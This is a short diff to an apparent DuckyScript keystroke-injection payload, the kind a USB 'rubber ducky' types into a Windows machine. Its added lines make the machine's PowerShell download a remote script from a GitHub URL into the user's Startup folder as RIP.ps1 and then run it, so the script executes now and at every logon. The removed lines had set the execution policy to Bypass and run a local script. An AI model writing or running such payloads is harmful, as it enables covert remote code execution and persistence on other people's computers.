@@ -9,17 +9,20 @@ DELAY 500
 ENTER
 
 DELAY 2000
-STRING Get-ExecutionPolicy -List
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaledmraad/Ratatouille/main/test.ps1" -OutFile "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RIP.ps1"
 ENTER
+
 DELAY 500
-STRING Set-ExecutionPolicy Bypass
+
+STRING cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+
 ENTER
+
 DELAY 500
-STRING Get-ExecutionPolicy -List
+
+STRING .\RIP.ps1
+
 ENTER
-DELAY 500
-STRING cd D: 
-ENTER
-DELAY 500
-STRING .\test.ps1
-ENTER
+
+
+
